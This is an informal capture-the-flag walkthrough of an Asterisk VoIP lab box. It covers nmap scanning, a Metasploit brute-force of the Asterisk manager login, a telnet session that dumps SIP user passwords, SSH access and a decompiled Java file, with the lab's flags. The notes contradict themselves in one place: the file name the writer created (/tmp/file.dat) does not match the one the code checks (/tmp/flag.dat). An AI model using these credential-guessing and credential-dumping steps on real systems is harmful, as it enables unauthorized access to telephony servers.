### ip = "10.49.167.58"


## Nmap Results
> nmap -p- -T5 10.49.167.58           
		Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-04 01:17 UTC
		Warning: 10.49.167.58 giving up on port because retransmission cap hit (2).
		Nmap scan report for 10.49.167.58
		Host is up (0.073s latency).
		Not shown: 65530 closed tcp ports (reset)
		PORT     STATE SERVICE
		22/tcp   open  ssh
		80/tcp   open  http
		1720/tcp open  h323q931
		2000/tcp open  cisco-sccp
		5038/tcp open  unknown
	
> nmap -sC -sV -sS -p 22,80,1720,2000,5038 10.49.167.58
		Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-04 01:24 UTC
		Nmap scan report for 10.49.167.58
		Host is up (0.065s latency).

		PORT     STATE SERVICE     VERSION
		22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
		| ssh-hostkey: 
		|   2048 fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 (RSA)
		|   256 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 (ECDSA)
		|_  256 c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d (ED25519)
		80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
		|_http-server-header: Apache/2.4.18 (Ubuntu)
		|_http-title: Aster CTF
		1720/tcp open  h323q931?
		2000/tcp open  cisco-sccp?
		5038/tcp open  asterisk    Asterisk Call Manager 5.0.2	
		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 40.61 seconds
	

## Gobuster Results
> gobuster dir -u http://10.49.167.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
		===============================================================
		Gobuster v3.8
		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
		===============================================================
		[+] Url:                     http://10.49.167.58
		[+] Method:                  GET
		[+] Threads:                 10
		[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
		[+] Negative Status codes:   404
		[+] User Agent:              gobuster/3.8
		[+] Timeout:                 10s
		===============================================================
		Starting gobuster in directory enumeration mode
		===============================================================
		/images               (Status: 301) [Size: 313] [--> http://10.49.167.58/images/]
		/assets               (Status: 301) [Size: 313] [--> http://10.49.167.58/assets/]
		/server-status        (Status: 403) [Size: 277]
		Progress: 220558 / 220558 (100.00%)
		===============================================================
		Finished
		===============================================================
There is Nothing suspicious found in /images and /assets

the output.pyc file in the webpage seemed to be suspicious hence downloaded it and content inside was encoded, went through hex decoding found 

	"¢ÍÞÝîíîîíîíÞîîÞGood job, user "admin" the open source framework for building communications, installed in the server.¬Good job reverser, python is very cool!
	Good job reverser, python is very cool!Good job revoï ..¾þ
	ìÞ................Þ"

### Username: "admin"


# WALK-THROUGH VID FROM YT
> msfconsole
	> search asterisk  ->found a login option ("auxiliary/voip/asterisk_login") 
	> show options
	> set RHOST 10.49.167.58
	> set username admin
	> run

It gave me the password: abc123

### admin : abc123


> telnet 10.49.167.58 5038
	Trying 10.49.167.58...
	Connected to 10.49.167.58.
	Escape character is '^]'.
	Asterisk Call Manager/5.0.2
	action: login
	username: admin
	secret: abc123

	Response: Success
	Message: Authentication accepted

	Event: FullyBooted
	Privilege: system,all
	Uptime: 1971
	LastReload: 1971
	Status: Fully Booted

	action: command
	command: sip show users

	Response: Success
	Message: Command output follows
	Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
	Output: 100                        100                               test             No   No        
	Output: 101                        101                               test             No   No        
	Output: harry                      p4ss#w0rd!#                       test             No   No 

----------------------------
ssh to  harry 
### harry : p4ss#w0rd!#

inside /harry/ ==> root.txt  Example_Root.jar 
run an http server to take the "Example_Root.jar" in the attacker machine
> python3 -m http.server (usr machine)
> wget http://usr_ip:8000/Example_Root.jar (attacker machine)

Used java decompiler :
	"""
		import java.io.File;
		import java.io.FileWriter;
		import java.io.IOException;

		public class Example_Root {
		   public static boolean isFileExists(File var0) {
		      return var0.isFile();
		   }

		   public static void main(String[] var0) {
		      String var1 = "/tmp/flag.dat";
		      File var2 = new File(var1);

		      try {
			 if (isFileExists(var2)) {
			    FileWriter var3 = new FileWriter("/home/harry/root.txt");
			    var3.write("my secret <3 baby");
			    var3.close();
			    System.out.println("Successfully wrote to the file.");
			 }
		      } catch (IOException var4) {
			 System.out.println("An error occurred.");
			 var4.printStackTrace();
		      }

		   }
		}
 	"""



flags 
	user.txt: "thm{bas1c_aster1ck_explotat1on}"
	
   Found the root flag after creating a file in /tmp :
   	> touch /tmp/file.dat
   	Automatically root.txt came in desktop 
	root.txt: "thm{fa1l_revers1ng_java}"












